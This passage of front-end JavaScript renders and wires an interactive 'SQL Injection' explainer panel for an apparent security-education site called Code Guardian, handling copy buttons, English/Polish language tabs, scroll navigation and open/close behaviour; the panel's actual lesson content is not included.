  highlighted = true;
}

function wireCopy(panel) {
  $$('.sqli-copy', panel).forEach((btn) => {
    btn.addEventListener('click', () => {
      const code = $('code', btn.parentElement).textContent;
      const label = $('span', btn);
      const write = () => {
        const old = label.textContent;
        label.textContent = tr(TXT.copied);
        btn.classList.add('copied');
        setTimeout(() => { label.textContent = old; btn.classList.remove('copied'); }, 1400);
      };
      if (navigator.clipboard?.writeText) navigator.clipboard.writeText(code).then(write, write);
      else write();
    });
  });
}

function wireLangTabs(panel) {
  $$('.sqli-lang-tab', panel).forEach((tab) => {
    tab.addEventListener('click', () => {
      const l = tab.dataset.lang;
      $$('.sqli-lang-tab', panel).forEach((t) => t.classList.toggle('active', t === tab));
      $$('.sqli-lang-panel', panel).forEach((p) => p.classList.toggle('active', p.dataset.lang === l));
    });
  });
}

function wireScrollSpy(panel) {
  const body = $('.sqli-body', panel);
  const links = $$('.sqli-nav-link', panel);
  links.forEach((link) => {
    link.addEventListener('click', (e) => {
      e.preventDefault();
      const target = $('#' + link.dataset.target, panel);
      if (target) body.scrollTo({ top: target.offsetTop - 24, behavior: 'smooth' });
    });
  });
  const sections = $$('.sqli-section', panel);
  body.addEventListener('scroll', () => {
    let current = sections[0]?.id;
    for (const s of sections) {
      if (s.offsetTop - 80 <= body.scrollTop) current = s.id;
    }
    links.forEach((l) => l.classList.toggle('active', l.dataset.target === current));
  }, { passive: true });
}

function render(panel) {
  const lang = getLang();
  panel.innerHTML = `
    <div class="sqli-topbar">
      <span class="sqli-brand">${SVG.shield}<span>Code <span class="grad">Guardian</span></span></span>
      <span class="sqli-topbar-title">SQL Injection</span>
      <span style="flex:1"></span>
      <button class="sqli-close" type="button" aria-label="${tr(TXT.close)}">${SVG.close}<span>${tr(TXT.close)}</span></button>
    </div>
    <div class="sqli-shell">
      <nav class="sqli-nav" aria-label="${lang === 'en' ? 'Page sections' : 'Sekcje strony'}">${buildNav()}</nav>
      <div class="sqli-body">${buildContent()}</div>
    </div>`;
  highlighted = false;
  $('.sqli-close', panel).addEventListener('click', close);
  wireCopy(panel);
  wireLangTabs(panel);
  wireScrollSpy(panel);
}

let _panel = null;
let _rendered = false;

function open() {
  if (!_panel) return;
  if (!_rendered) { render(_panel); _rendered = true; }
  _panel.classList.add('open');
  document.body.classList.add('sqli-lock');
  highlightOnce(_panel);
  const body = $('.sqli-body', _panel);
  if (body) body.scrollTop = 0;
}

function close() {
  if (!_panel) return;
  _panel.classList.remove('open');
  document.body.classList.remove('sqli-lock');
}

export function openSqliPage() { open(); }

export function initSqliPage() {
  _panel = $('#sqli-page');
  if (!_panel) return;

  // Re-render on language change so content tracks the global toggle.
  // initLang re-runs render() which re-creates the rest of the page; we hook
  // the global toggle button to also refresh this panel if it was opened.
  const langBtn = $('#lang-toggle');
  if (langBtn) {
    langBtn.addEventListener('click', () => {
      // language flips synchronously in initLang's own listener; defer to next tick
      setTimeout(() => {
        if (_rendered) { const wasOpen = _panel.classList.contains('open'); render(_panel); if (wasOpen) { _panel.classList.add('open'); highlighted = false; highlightOnce(_panel); } }
      }, 0);
    });
  }

  const openBtn = $('#sqli-tab');
  if (openBtn) openBtn.addEventListener('click', open);

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && _panel.classList.contains('open')) close();
  });
}
